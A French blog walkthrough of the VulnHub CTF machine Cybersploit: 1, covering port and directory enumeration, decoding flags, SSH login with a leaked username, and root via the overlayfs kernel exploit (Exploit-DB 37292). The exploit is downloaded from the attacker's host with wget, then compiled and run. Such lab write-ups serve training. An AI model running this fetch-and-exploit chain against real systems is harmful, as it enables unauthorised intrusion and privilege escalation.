---
title: "CTF Cybersploit: 1"
date: 2021-05-31
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/cybersploit-1,506
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.36`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir Cybersploit1 && cd Cybersploit1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
|_  256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
```

On a un un serveur **SSH** sur le port **22** et un serveur **Apache** 2.2.22 sur le port **80**.

Astuce vous pouvez ajouter le domaine _cybersploit-1.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).

```bash
$ sudo vim /etc/hosts
192.168.1.36    cybersploit-1.home
```

Avec **Gobuster**, on scan dossiers et pages présents sur le serveur **Apache**.

```bash
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js,.md,.log,.zip 
/index                (Status: 200) [Size: 2333]
/index.html           (Status: 200) [Size: 2333]
/robots               (Status: 200) [Size: 79]  
/robots.txt           (Status: 200) [Size: 79]  
/hacker               (Status: 200) [Size: 3757743]
```

Dans le fichier [robots.txt](http://cybersploit-1.home/robots.txt), on une chaine de caractère de type **base64** `R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9`.

```bash
$ echo 'R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9' | base64 -d
Good Work !
Flag1: cybersploit{youtube.com/c/cybersploit}
```

On vient de découvrir le 1er flag. Dans le code source de la page d'accueil, on a un potentiel utilisateur "itsskv".

```txt
<!-------------username:itsskv--------------------->
```

## Pénétration

```bash
$ ssh itsskv@$IP
password: cybersploit{youtube.com/c/cybersploit}
```

```bash
$ cat flag2.txt 
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010 01101011 00100000 00100001 00001010 01100110 01101100 01100001 01100111 00110010 00111010 00100000 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 01111011 01101000 01110100 01110100 01110000 01110011 00111010 01110100 00101110 01101101 01100101 00101111 01100011 01111001 01100010 01100101 01110010 01110011 01110000 01101100 01101111 01101001 01110100 00110001 01111101
```

En convertissant de binaire vers texte (on trouve plein de convertisseurs sur Internet), on obtient le contenu du second flage ci-dessous.

```txt
good work !
flag2: cybersploit{https:t.me/cybersploit1}
```

Regardons la version du noyau **Linux**.

```bash
$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic
```

Après une recherche d'exploit via **searchsploit**, on en trouve un qui pourrait nous correspondre.

```bash
$ searchsploit linux kernel 3.13.0-32
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation  | linux/local/37292.c
```

On vérifie quand même la distribution **Linux** du serveur.

```bash
$ cat /etc/issue
Ubuntu 12.04.5 LTS \n \l
```

On est sur du **Ubuntu** 12.04.5 avec un kernel **Linux** 3.13.0, c'est exploitable. Avant de s'emballer, on vérifie si on peut utiliser le compilateur **GCC** (**G**NU **C**ompiler **C**ollection).

```bash
$ which gcc
/usr/bin/gcc
```

C'est tout bon. On va donc transférer l'exploit sur le serveur via un serveur HTTP sur **Python**.

```bash
$ searchsploit -p 37292
Path: /usr/share/exploitdb/exploits/linux/local/37292.c
$ cp /usr/share/exploitdb/exploits/linux/local/37292.c exploit.c
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

De retour sur le serveur, on se place dans le dossier "/tmp" et on récupère le fichier de l'exploit afin de le compiler et de l'exécuter.

```bash
$ cd /tmp
$ wget http://192.168.1.38:8000/exploit.c
$ gcc exploit.c -o exploit
$ ./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
$ id
uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
```

Chouette, l'exploit a bien fonctionné car on est root de la machine. On trouve facilement le troisième et dernier flag.

```bash
$ cat /root/finalflag.txt
flag3: cybersploit{Z3X21CW42C4 many many congratulations !}
```
